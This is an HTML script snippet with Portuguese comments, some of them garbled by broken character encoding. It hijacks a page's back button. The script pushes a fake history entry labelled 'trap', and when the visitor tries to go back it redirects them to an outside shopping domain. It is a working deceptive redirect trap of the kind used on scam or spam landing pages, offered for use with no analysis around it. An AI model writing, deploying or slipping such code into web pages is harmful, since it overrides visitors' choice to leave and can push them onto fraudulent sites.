    <script>
(function () {
  // üîó URL de destino quando tentar voltar
  const destino = "https://finaldeacesso.shop/backredirectup1/";
  let jaRedirecionou = false;

  // Fun√ß√£o que faz o redirect uma √∫nica vez
  function redirecionar() {
    if (jaRedirecionou) return;
    jaRedirecionou = true;
    window.location.replace(destino);
  }

  // Empurra um estado extra pro hist√≥rico
  // assim, quando o usu√°rio apertar "voltar", cai no popstate
  window.history.pushState({ trap: true }, "", window.location.href);

  // Quando o usu√°rio tentar voltar (bot√£o voltar / gesto de back)
  window.addEventListener("popstate", function (event) {
    // Se ainda n√£o redirecionou, manda pro destino
    redirecionar();
  });
})();
</script>

